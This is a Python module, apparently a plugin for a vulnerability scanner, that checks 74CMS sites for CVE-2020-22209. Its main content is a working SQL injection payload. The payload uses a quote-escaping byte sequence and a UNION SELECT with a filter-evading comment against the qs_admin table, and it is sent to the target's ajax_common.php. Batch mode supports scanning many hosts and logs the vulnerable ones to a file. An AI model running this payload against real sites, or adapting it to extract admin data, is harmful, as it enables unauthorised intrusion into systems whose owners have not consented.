import requests,re,urllib3
from hashlib import md5
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2020_22209:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key

	def scan(self,baseurl):
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		rand = self.randomInt(100000, 200000)
		url=baseurl+f"plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5({rand}),3+from+qs_admin%23--"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if response.status_code == 200 and md5(str(rand).encode()).hexdigest() in response.text:
			OutPrintInfoSuc("74CMS", f"存在CVE-2020-22209: {baseurl}")
			if self.batch:
				OutPutFile("74cms_2020_22209.txt",f"存在CVE-2020-22209: {baseurl}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在CVE-2020-22209")
	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

		if not self.batch:
			OutPrintInfo("74CMS", "开始检测CVE-2020-22209...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "CVE-2020-22209检测结束")
